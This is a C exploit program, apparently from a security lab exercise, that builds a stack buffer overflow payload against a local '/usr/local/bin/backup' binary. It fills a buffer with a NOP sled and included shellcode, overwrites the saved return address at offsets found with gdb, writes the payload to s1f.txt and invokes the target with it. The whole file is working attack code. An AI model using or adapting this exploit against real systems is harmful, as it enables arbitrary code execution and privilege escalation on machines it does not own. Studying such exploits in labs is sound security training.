#include "shellcode.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define N 3016
#define PD 512
#define NOP 0x90
char large_string[N];

int guess_stack()
{
	char buffer[3000];
	unsigned c = (unsigned)buffer;
	printf("I think statck-3000 is 0x%x\n",c);
	return c;
}

int main()
{
	int pos;
	int i;
	FILE *f;

	pos = guess_stack() + PD;

	// we can know from gdb:
	// i  -> buffer[3004]
	// fp -> buffer[3008]
	
	// 3004 = 0x 00 00 0b bc
	// so the upper bytes is just same for 3005,3006,3007

	*( (int*)(large_string+3004)) = 3004;
	*( (int*)(large_string+3008)) = 3004;	
	*( (int*)(large_string+3012)) = pos;

	for(i = 0; i < PD*2; ++i)
		large_string[i] = NOP;

	for(i = 0; i < strlen(shellcode); ++i)
		large_string[i + PD*2] = shellcode[i];

	f = fopen("s1f.txt", "w");
	for(i = 0; i < N; ++i)
		fputc(large_string[i], f);
	fclose(f);

	system("/usr/local/bin/backup backup s1f.txt");

	return 0;
}
